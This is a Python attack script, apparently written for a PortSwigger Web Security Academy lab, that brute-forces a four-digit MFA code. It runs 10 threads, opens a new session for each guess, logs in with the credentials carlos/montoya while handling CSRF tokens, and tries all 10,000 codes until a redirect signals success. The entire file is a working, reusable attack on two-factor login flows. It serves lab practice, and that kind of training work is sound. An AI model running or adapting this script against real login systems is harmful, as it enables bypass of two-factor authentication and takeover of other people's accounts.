import requests
import re
from concurrent.futures import ThreadPoolExecutor
import threading

TARGET = "https://<YOUR-LAB-ID>.web-security-academy.net"
found = threading.Event()
result = []
counter = threading.Lock()
progress = [0]

def get_csrf(session, url):
    r = session.get(url)
    match = re.search(r'name="csrf" value="([^"]+)"', r.text)
    return match.group(1) if match else None

def try_code(code):
    if found.is_set():
        return

    s = requests.Session()
    try:
        csrf1 = get_csrf(s, f"{TARGET}/login")
        s.post(f"{TARGET}/login", data={
            "csrf": csrf1,
            "username": "carlos",
            "password": "montoya"
        }, allow_redirects=False)

        csrf2 = get_csrf(s, f"{TARGET}/login2")
        r = s.post(f"{TARGET}/login2", data={
            "csrf": csrf2,
            "mfa-code": f"{code:04d}"
        }, allow_redirects=False)

        with counter:
            progress[0] += 1
            print(f"\r[*] Progress: {progress[0]}/10000 | Trying: {code:04d}", end="", flush=True)

        if r.status_code == 302:
            found.set()
            result.append(f"{code:04d}")
            print(f"\n\n[+] FOUND: {code:04d}")

    except Exception as e:
        with counter:
            progress[0] += 1

print("[*] Starting brute force with 10 threads...")
with ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(try_code, range(10000))

if not result:
    print("\n[-] Not found")
